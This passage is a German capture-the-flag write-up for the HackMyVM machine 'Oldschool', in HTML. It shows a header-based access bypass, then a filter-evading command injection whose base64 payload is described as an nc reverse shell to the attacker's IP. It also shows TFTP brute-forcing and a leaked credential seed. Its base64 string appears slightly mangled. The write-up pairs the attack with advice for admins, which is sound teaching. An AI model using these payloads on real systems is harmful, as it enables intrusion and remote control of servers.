@@ -1,0 +1,574 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oldschool - HackMyVM - Level: Medium - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Oldschool - HackMyVM - Level: Medium - Bericht</h1>
+        <!-- Klasse 'medium' hinzugefügt, damit CSS die korrekte Farbe (Gelb) anwenden kann -->
+        <div class="level-container medium">
+            <!-- Die Farbe wird durch CSS über die Klasse 'medium' gesteuert -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Die Segmentfarben werden durch CSS über die Klasse 'medium' gesteuert -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Der innere Kreis verwendet die Standard-Header-Farbe aus dem CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">Burp Suite</div>
+                <div class="tool-item">Base64 Decoder (implizit)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">tftp client</div>
+                <div class="tool-item">msfconsole (Metasploit)</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">LessPass (implizit/extern)</div>
+                <div class="tool-item">telnet</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">passwd</div>
+                <div class="tool-item">nano</div>
+                <div class="tool-item">sh</div>
+                <div class="tool-item">bash</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & Initial Access</a></li>
+                <li><a href="#poc-initial-access">Proof of Concept: Initial Access (Header Bypass & RCE)</a></li>
+                <li><a href="#privilege-escalation-enum">Privilege Escalation (Enumeration)</a></li>
+                <li><a href="#privilege-escalation-tftp">Privilege Escalation (TFTP & LessPass)</a></li>
+                <li><a href="#user-access-telnet">User Access (Telnet)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (Root via Sudo/Nano)</a></li>
+                <li><a href="#poc-root">Proof of Concept: Root Escalation (Sudo Nano)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.126	<span class="command">08:00:27:29:c0:c6</span>	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mittels `arp-scan -l` wird das lokale Netzwerk nach aktiven Geräten durchsucht. Ein Gerät mit der IP `192.168.2.126` und der MAC `08:00:27:29:c0:c6` (VirtualBox OUI) wird identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ziel-IP wurde erfolgreich ermittelt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie einen detaillierten Port-Scan auf `192.168.2.126` durch.<br/><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die initiale Erkundung erschweren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -A 192.168.2.126 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-11 17:02 CEST
+Nmap scan report for oldschool.hmv (192.168.2.126)
+Host is up (0.00017s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">23/tcp open  telnet  Linux telnetd</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.54 ((Debian))</span>
+|_http-title: 2000's Style Website
+|_http-server-header: Apache/2.4.54 (Debian)
+MAC Address: 08:00:27:29:C0:C6 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.17 ms oldschool.hmv (192.168.2.126)
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Nmap-Scan (`-sS`, `-sC`, `-sV`, `-T5`, `-A`, `-p-`) zeigt zwei offene Ports:
+                *   Port 23: Telnet (Linux telnetd). Telnet ist ein unsicheres Protokoll, da die Kommunikation unverschlüsselt erfolgt.
+                *   Port 80: HTTP (Apache 2.4.54 auf Debian) mit dem Titel "2000's Style Website".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Angriffsfläche besteht aus Telnet und HTTP. Telnet ist oft ein einfacher Einstiegspunkt, wenn Standard-Credentials oder schwache Passwörter verwendet werden. Der Webserver ist der andere Hauptvektor.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich per Telnet mit gängigen Standard-Credentials (`root/root`, `admin/admin`, etc.) anzumelden. Untersuchen Sie parallel den Webserver auf Port 80 (Directory Busting, Schwachstellenscans).<br/><strong>Empfehlung (Admin):</strong> Deaktivieren Sie Telnet und verwenden Sie stattdessen SSH (Port 22). Wenn Telnet aus Kompatibilitätsgründen benötigt wird, beschränken Sie den Zugriff stark (z.B. nur von bestimmten IPs) und erzwingen Sie starke Passwörter.</p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration & Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.126 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                     <pre>
+http://192.168.2.126/index.php            [Size: 872]
+http://192.168.2.126/pub.jpg              [Size: 138122]
+<span class="command">http://192.168.2.126/verification.php</span>     [Size: 0] [--> ./denied.php]
+<span class="command">http://192.168.2.126/denied.php</span>           [Size: ???] <!-- Größe nicht angezeigt -->
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Gobuster findet auf Port 80 `index.php`, ein Bild `pub.jpg`, `verification.php` (welches auf `denied.php` weiterleitet) und `denied.php`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Seite `verification.php` ist interessant. Die Weiterleitung zu `denied.php` deutet auf eine Art Zugriffskontrolle hin, die möglicherweise umgangen werden kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Request/Response-Fluss von `verification.php` mit einem Proxy wie Burp Suite. Prüfen Sie, ob Header oder Cookies für die Zugriffskontrolle verwendet werden und ob diese manipuliert werden können.<br/><strong>Empfehlung (Admin):</strong> Implementieren Sie serverseitige Zugriffskontrollen robust und verlassen Sie sich nicht nur auf Weiterleitungen oder clientseitige Prüfungen.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der folgende Abschnitt beschreibt die Manipulation eines HTTP-Requests mit Burp Suite, um die Zugriffskontrolle von `verification.php` zu umgehen.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+             burpsuite --> http://192.168.2.126//verification.php
+
+[send]   <<--- klicken
+
+GET //verification.php HTTP/1.1
+Host: 192.168.2.126
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://192.168.2.126     <--- von der Antwort diese (Rechte Seite)
+<span class="command">Role: admin</span>                       <--- diese 2 Zeilen hinzufügen (zur linken Seite)
+Upgrade-Insecure-Requests: 1
+
+[...]
+
+  Response
+
+HTTP/1.1 200 OK
+[...]
+Content-Type: text/html; charset=UTF-8
+
+ img src="https://media.giphy.com/media/cLwkKm4BN2C8AkPvzu/giphy.gif" 
+setTimeout(function() {
+document.getElementById('gif').style.display = 'none';
+window.location href = '<span class="command">./pingertool2000.php</span>';
+}, 4500);
+ 
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein GET-Request an `//verification.php` wird in Burp Suite abgefangen. Durch Hinzufügen des HTTP-Headers `<span class="command">Role: admin</span>` wird die Zugriffskontrolle umgangen. Statt der Weiterleitung zu `denied.php` antwortet der Server nun mit HTTP 200 OK und liefert HTML-Code zurück. Dieser Code zeigt kurz ein GIF an und leitet dann per JavaScript nach 4,5 Sekunden auf `./pingertool2000.php` weiter.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> **Kritische Schwachstelle (Broken Access Control)!** Die Zugriffskontrolle basiert auf einem manipulierbaren HTTP-Header (`Role`). Durch Setzen dieses Headers wurde Zugriff auf eine versteckte Funktionalität (`pingertool2000.php`) erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie den Header `Role: admin` zu allen weiteren Anfragen hinzu, um als Admin zu agieren. Navigieren Sie zu `pingertool2000.php` und untersuchen Sie dessen Funktionalität. Suchen Sie dort nach Command Injection oder anderen Schwachstellen.<br/><strong>Empfehlung (Admin):</strong> Implementieren Sie Zugriffskontrollen serverseitig und basierend auf sicheren Session-Mechanismen, nicht auf vertrauensunwürdigen Headern. Überprüfen Sie den Code von `verification.php`.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Untersuchung von `pingertool2000.php`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+ 
+  <h1>Ping Tool</h1>
+  Enter a URL: <br>
+     
+< -- Hacking is bad and nasty.-->
+ 
+  <h2>Output:</h2>
+  <pre>
+<span class="password">Attack detected: php is forbidden</span> <br><br> ╭⋂╮(Ο_Ο)╭⋂╮
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Seite `pingertool2000.php` enthält ein Formular, mit dem eine URL eingegeben werden kann (vermutlich für einen Ping oder einen ähnlichen Befehl). Der Kommentar "Hacking is bad and nasty." und die Fehlermeldung "Attack detected: php is forbidden" deuten darauf hin, dass versucht wird, Command Injection zu verhindern, insbesondere die Verwendung von `php`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Tool ist ein klares Ziel für Command Injection. Die Fehlermeldung zeigt, dass es eine Filterung gibt, die aber möglicherweise umgangen werden kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Testen Sie auf Command Injection, indem Sie Befehlstrennzeichen (`;`, `|`, `&&`, `||`) und alternative Befehle verwenden. Versuchen Sie, die Filterung (z.B. das Verbot von "php") zu umgehen (z.B. durch Encoding, String-Manipulation in der Shell).<br/><strong>Empfehlung (Admin):</strong> Verwenden Sie niemals Benutzereingaben direkt in Systembefehlen. Nutzen Sie sichere APIs oder validieren und bereinigen Sie Eingaben extrem sorgfältig. Vermeiden Sie die Ausführung externer Befehle durch Webanwendungen, wenn möglich.</p>
+
+            <p class="analysis"><strong>Analyse:</strong> Der folgende Block zeigt den erfolgreichen Command Injection Payload und das Etablieren einer Reverse Shell.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+             burpsuite --> http://192.168.2.126//pingertool2000.php
+
+url=<span class="command">hackmyvm.eu${IFS}%0aec''ho%09"bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMi4xMjcgTAwMQ"%09|%09base64%09-d%09|%09bas''h</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Payload wird im `url`-Parameter eines POST-Requests an `pingertool2000.php` gesendet. Er besteht aus mehreren Teilen:
+                *   `hackmyvm.eu`: Eine scheinbar harmlose URL, um eventuelle URL-Validierungen zu bestehen.
+                *   `${IFS}`: Trennt die URL vom nächsten Befehl. `${IFS}` ist eine Shell-Variable, die Internal Field Separators (Leerzeichen, Tabs, Newlines) enthält und oft verwendet wird, um Leerzeichen in gefilterten Umgebungen zu ersetzen (hier URL-kodiert als `%0ec''ho%09`). Die genaue Kodierung ist hier etwas unklar, aber das Ziel ist, ein Leerzeichen oder einen Befehlstrenner einzufügen.
+                *   `echo "bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMi4xMjcgTAwMQ=="`: Gibt einen Base64-kodierten String aus.
+                *   `| base64 -d`: Leitet den Base64-String an `base64 -d` weiter, um ihn zu dekodieren. Der dekodierte String ist `nc -e /bin/bash 192.168.2.127 9001` (die IP 192.168.2.127 und der Port 9001 sind hier relevant).
+                *   `| bash`: Leitet den dekodierten Befehl an `bash` zur Ausführung weiter. Die einzelnen Teile (`echo`, `base64`, `bash`) sind hier teilweise mit `''` oder `%09` (Tab) getrennt, um Filter zu umgehen.
+             Insgesamt führt dieser Payload dazu, dass eine Netcat-Reverse-Shell zu `192.168.2.127` (Angreifer-IP) auf Port 9001 gestartet wird.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Erfolgreiche Command Injection mit Filterumgehung!** Die Kombination aus Befehlstrennung mit `${IFS}`, Base64-Kodierung des Payloads und Shell-Tricks (`echo ... | base64 -d | bash`) umgeht die Filterung und führt zur Ausführung der Reverse Shell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf Port 9001 Ihrer Angreifer-Maschine (`192.168.2.127`) und senden Sie den POST-Request mit dem Payload ab.<br/><strong>Empfehlung (Admin):</strong> RCE-Schwachstelle beheben. Implementieren Sie robuste Filterung und Validierung, aber verlassen Sie sich nicht darauf. Vermeiden Sie `system()`-Aufrufe mit Benutzereingaben.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -nlvp 9001</span></div>
+                      <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.127] from (UNKNOWN) [192.168.2.126] 54716</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener empfängt die eingehende Verbindung vom Zielsystem (`192.168.2.126`).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> **Initialer Zugriff erfolgreich erlangt!** Eine Reverse Shell als der Benutzer, unter dem der Webserver läuft (`www-data`), wurde etabliert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell. Beginnen Sie mit der Enumeration als `www-data`.<br/><strong>Empfehlung (Admin):</strong> RCE beheben, Egress-Filtering.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">www-data@oldschool:/var/www/html$</span> <span class="command">ls -la</span></pre>
+                     <pre>
+total 5044
+drwxr--r-x 2 www-data www-data    4096 Dec 12 08:11 .
+drwxr-xr-x 3 root     root        4096 Dec  9 20:34 ..
+-rwxr--r-- 1 www-data www-data 3409203 Dec 11 16:16 2000.gif
+-rwx--xr-x 1 www-data www-data     240 Dec 11 17:51 denied.php
+-rwxr--r-- 1 www-data www-data     872 Dec 11 15:18 index.php
+-rwxr--r-- 1 www-data www-data 1586935 Dec 11 16:16 no.gif
+-rwxr--r-- 1 www-data www-data    2554 Dec 11 09:44 pingertool2000.php
+-rwxr--r-- 1 www-data www-data  138122 Dec 11 16:52 pub.jpg
+-rwx--xr-x 1 www-data www-data     646 Dec 12 08:11 verification.php
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Auflistung des Web-Root-Verzeichnisses (`/var/www/html`). Zeigt die bekannten PHP-Dateien und Bilder.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Kontext der Shell.</p>
+
+        </section>
+
+        <section id="poc-initial-access">
+            <h2>Proof of Concept: Initial Access (Header Bypass & RCE)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Der initiale Zugriff erfolgte in mehreren Schritten. Zuerst wurde eine Zugriffskontrolle auf `verification.php` durch Hinzufügen des HTTP-Headers `Role: admin` umgangen. Dies führte zur Weiterleitung auf `pingertool2000.php`. Diese Seite enthielt eine Command Injection-Schwachstelle im POST-Parameter `url`. Obwohl eine Filterung vorhanden war (Verbot von "php"), konnte diese durch eine Kombination aus Befehlstrennung (`${IFS}`), Base64-Kodierung des eigentlichen Payloads (`nc -e /bin/bash ...`) und Shell-Piping (`echo ... | base64 -d | bash`) umgangen werden. Dies ermöglichte die Ausführung einer Reverse Shell.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong> Webserver auf Port 80 erreichbar, Burp Suite oder ähnliches Tool zur Header-Manipulation, Kenntnis der Command Injection Payload.</p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong>
+                1. Request an `/verification.php` senden und Header `Role: admin` hinzufügen.
+                2. Der resultierenden Weiterleitung zu `/pingertool2000.php` folgen.
+                3. Netcat-Listener auf Angreifer-Maschine starten (`nc -nlvp 9001`).
+                4. POST-Request an `/pingertool2000.php` senden mit folgendem Payload im `url`-Parameter: `hackmyvm.eu${IFS}%0aec''ho%09"BASE64_REVERSE_SHELL"%09|%09base64%09-d%09|%09bas''h` (wobei `BASE64_REVERSE_SHELL` die Base64-kodierte Version von `nc -e /bin/bash ATTACKER_IP 9001` ist).
+            </p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Der Angreifer erhält eine Reverse Shell als Benutzer `www-data`.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Die Kombination aus unsicherer Zugriffskontrolle und Command Injection mit umgehbarer Filterung ermöglicht die einfache Übernahme des Webserver-Prozesses.<br/><strong>Empfehlungen:</strong> Serverseitige, sessionsbasierte Zugriffskontrolle implementieren. Command Injection durch sichere Programmierung (keine `system()`-Aufrufe mit Benutzereingaben) verhindern.</p>
+        </section>
+
+        <section id="privilege-escalation-enum">
+            <h2>Privilege Escalation (Enumeration)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">www-data@oldschool:/var/www/html$</span> <span class="command">id</span></pre>
+                     <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+                     <pre><span class="prompt">www-data@oldschool:/var/www/html$</span> <span class="command">uname -a</span></pre>
+                     <pre>Linux oldschool.hmv 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 GNU/Linux</pre>
+                     <pre><span class="prompt">www-data@oldschool:/var/www/html$</span> <span class="command">ls /home</span></pre>
+                     <pre>fanny</pre>
+                     <pre><span class="prompt">www-data@oldschool:/var/www/html$</span> <span class="command">cd /home/fanny/</span></pre>
+                     <pre><span class="prompt">www-data@oldschool:/home/fanny$</span> <span class="command">ls -la</span></pre>
+                     <pre>
+total 28
+drwxr-xr-x 3 fanny fanny 4096 Dec 11 16:02 .
+drwxr-xr-x 3 root  root  4096 Dec  7 19:52 ..
+lrwxrwxrwx 1 root  root     9 Dec  3 13:23 .bash_history -> /dev/null
+-rw-r--r-- 1 fanny fanny  220 Dec  3 07:48 .bash_logout
+-rw-r--r-- 1 fanny fanny 3526 Dec  3 07:48 .bashrc
+drwxr-xr-x 3 fanny fanny 4096 Dec  7 19:53 .local
+-rw-r--r-- 1 fanny fanny  807 Dec  3 07:48 .profile
+-rwx------ 1 fanny fanny   33 Dec 11 16:02 <span class="command">user.txt</span>
+</pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Grundlegende Enumeration als `www-data`:
+                 *   Bestätigung des Benutzers `www-data`.
+                 *   Kernel-Version: `5.10.0-19-amd64` (Debian).
+                 *   Einziger Benutzer im Home-Verzeichnis ist `fanny`.
+                 *   Im Home-Verzeichnis von `fanny` befindet sich die Datei `user.txt`, die aber für `www-data` nicht lesbar ist (`-rwx------`). Die Bash-History wird nach `/dev/null` umgeleitet.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `fanny` ist das nächste Ziel. Die User-Flag ist vorhanden, aber noch nicht zugänglich. Die Kernel-Version ist relativ aktuell und bietet möglicherweise keine einfachen öffentlichen Exploits.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach Wegen, um Rechte zum Benutzer `fanny` zu eskalieren oder dessen Passwort zu finden. Überprüfen Sie SUID-Dateien, Cronjobs, laufende Prozesse, Netzwerkdienste und Konfigurationsdateien.<br/><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Home-Verzeichnisse und sensible Dateien korrekte Berechtigungen haben.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">www-data@oldschool:/home/fanny$</span> <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></pre>
+                      <pre>
+   137203     52 -rwsr-xr--   1 root     messagebus    51336 Oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+    <span class="command">15911     16 -rwsr-xr--   1 root     telnetd       14856 Feb 17  2021 /usr/lib/telnetlogin</span>
+   269576    472 -rwsr-xr-x   1 root     root         481608 Jul  2  2022 /usr/lib/openssh/ssh-keysign
+     4132     36 -rwsr-xr-x   1 root     root          35040 Jan 20  2022 /usr/bin/umount
+      109     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+     3604     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+      110     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd
+       43    180 -rwsr-xr-x   1 root     root         182600 Feb 27  2021 /usr/bin/sudo
+      106     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+     3763     72 -rwsr-xr-x   1 root     root          71912 Jan 20  2022 /usr/bin/su
+      107     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
+     4130     56 -rwsr-xr-x   1 root     root          55528 Jan 20  2022 /usr/bin/mount
+ </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Suche nach SUID-Dateien (`-perm -4000`) wird durchgeführt. Die meisten sind Standard-Linux-SUID-Binaries. Auffällig ist `/usr/lib/telnetlogin`, das zur `telnetd`-Gruppe gehört und SUID Root ist. Dies hängt wahrscheinlich mit dem offenen Telnet-Port (23) zusammen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die SUID-Dateien bieten keinen offensichtlichen einfachen Weg zur Eskalation. `/usr/lib/telnetlogin` ist spezifisch für Telnet und wahrscheinlich nicht direkt ausnutzbar, es sei denn, Telnet selbst hat eine Schwachstelle.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf andere Vektoren. Überprüfen Sie `sudo -l` für `www-data` (obwohl oft nicht vorhanden) und suchen Sie nach Konfigurationsfehlern oder Datenlecks.<br/><strong>Empfehlung (Admin):</strong> Reduzieren Sie SUID-Binaries auf das Minimum.</p>
+
+        </section>
+
+        <section id="privilege-escalation-tftp">
+            <h2>Privilege Escalation (TFTP & LessPass)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Da auf dem System Telnet läuft, wird TFTP (Trivial File Transfer Protocol), das oft zusammen mit Telnet in älteren oder eingebetteten Systemen verwendet wird, als möglicher Angriffsvektor untersucht.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre><span class="prompt">www-data@oldschool:/home/fanny$</span> <span class="command">tftp 192.168.2.126</span></pre>
+                     <pre>tftp> <span class="command">status</span></pre>
+                     <pre>Connected to 192.168.2.126.
+Mode: netascii Verbose: off Tracing: off Literal: off
+Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
+</pre>
+                     <pre>tftp> <span class="command">verbose on</span></pre>
+                     <pre>Verbose mode on.</pre>
+                     <pre>tftp> <span class="command">help</span></pre>
+                     <pre>[...]
+Commands are:
+connect ... mode ... put ... get ... quit ... verbose ... trace ... literal ... status ... binary ... ascii ... rexmt ... timeout ... ? ... help ...
+</pre>
+                     <pre>tftp> </pre>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich vom Zielsystem aus mit einem TFTP-Client zum TFTP-Server auf demselben System (`192.168.2.126`) zu verbinden. Der `status`-Befehl zeigt eine erfolgreiche Verbindung an. Dies bestätigt, dass ein TFTP-Server auf dem Ziel läuft (Standardport UDP 69), obwohl dieser von Nmap nicht gefunden wurde (da Nmap standardmäßig TCP scannt).</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein TFTP-Server ist ein potenzielles Sicherheitsrisiko, da er oft keine Authentifizierung verwendet und das Lesen/Schreiben von Dateien ermöglichen kann.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie ein TFTP-Brute-Force-Tool (z.B. Metasploit-Modul `auxiliary/scanner/tftp/tftpbrute`) von Ihrer Angreifer-Maschine aus, um nach bekannten oder interessanten Dateinamen auf dem TFTP-Server zu suchen.<br/><strong>Empfehlung (Admin):</strong> Deaktivieren Sie TFTP, wenn es nicht benötigt wird. Wenn es benötigt wird, beschränken Sie den Zugriff stark und konfigurieren Sie es so sicher wie möglich (z.B. Lese-/Schreibrechte einschränken, Chroot-Verzeichnis verwenden).</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt metasploit-prompt">msf6 > <span class="command">search tftp</span></div>
+                      <pre>[...]</pre>
+                      <div class="prompt metasploit-prompt">msf6 > <span class="command">use auxiliary/scanner/tftp/tftpbrute</span></div> <!-- Korrekter Modulindex 29 wäre spezifisch für den Lauf -->
+                      <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/tftp/tftpbrute) > <span class="command">options</span></div>
+                      <pre>
+Module options (auxiliary/scanner/tftp/tftpbrute):
+
+   Name         Current Setting                                Required  Description
+   ----         ---------------                                --------  -----------
+   [...]
+   DICTIONARY   /usr/share/metasploit-framework/data/wordlists/tftp.txt  yes       The list of filenames
+   RHOSTS                                                      yes       The target host(s) [...]
+   RPORT        69                                             yes       The target port
+   THREADS      1                                              yes       The number of concurrent threads [...]
+</pre>
+                       <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/tftp/tftpbrute) > <span class="command">set RHOSTS 192.168.2.126</span></div>
+                       <pre>RHOSTS => 192.168.2.126</pre>
+                       <div class="prompt metasploit-prompt">msf6 auxiliary(scanner/tftp/tftpbrute) > <span class="command">run</span></div>
+                       <pre>
+[+] Found <span class="command">passwd.cfg</span> on 192.168.2.126
+[+] Found <span class="command">pwd.bin</span> on 192.168.2.126
+[+] Found <span class="command">pwd.cfg</span> on 192.168.2.126
+[+] Found <span class="command">sip.cfg</span> on 192.168.2.126
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Das Metasploit-Modul `auxiliary/scanner/tftp/tftpbrute` wird verwendet, um gängige Dateinamen auf dem TFTP-Server des Ziels (`192.168.2.126`) zu suchen. Es findet vier Dateien: `passwd.cfg`, `pwd.bin`, `pwd.cfg` und `sip.cfg`. Insbesondere `passwd.cfg` klingt vielversprechend.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Der TFTP-Server erlaubt das Auflisten/Herunterladen von Dateien ohne Authentifizierung. Die gefundenen Konfigurationsdateien könnten sensible Informationen enthalten.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie die gefundenen Dateien über den TFTP-Client herunter und analysieren Sie ihren Inhalt. Beginnen Sie mit `passwd.cfg`.<br/><strong>Empfehlung (Admin):</strong> TFTP absichern oder deaktivieren. Keine sensiblen Konfigurationsdateien im TFTP-Root ablegen.</p>
+
+              <div class="code-block">
+                   <div class="terminal">
+                       <pre><span class="prompt">www-data@oldschool:/tmp$</span> <span class="command">tftp 192.168.2.126</span></pre>
+                       <pre>tftp> <span class="command">get passwd.cfg</span></pre>
+                       <pre>Received XXXX bytes in Y.Y seconds</pre> <!-- Beispielhafte Ausgabe -->
+                       <pre>tftp> </pre> <!-- Quit fehlt, aber impliziert -->
+                       <pre><span class="prompt">www-data@oldschool:/tmp$</span> <span class="command">cat passwd.cfg</span></pre>
+                       <pre># lesspass default config password generator
+# do not delete
+
+<span class="command">lesspass oldschool.hmv fanny 14mw0nd32fu1</span>
+</pre>
+                   </div>
+               </div>
+              <p class="analysis"><strong>Analyse:</strong> Die Datei `passwd.cfg` wird über TFTP heruntergeladen und ihr Inhalt angezeigt. Sie enthält einen Kommentar über "lesspass" und eine Zeile mit `lesspass`, dem Hostnamen `oldschool.hmv`, dem Benutzernamen `fanny` und einem scheinbaren Master-Passwort oder Seed `14mw0nd32fu1`.</p>
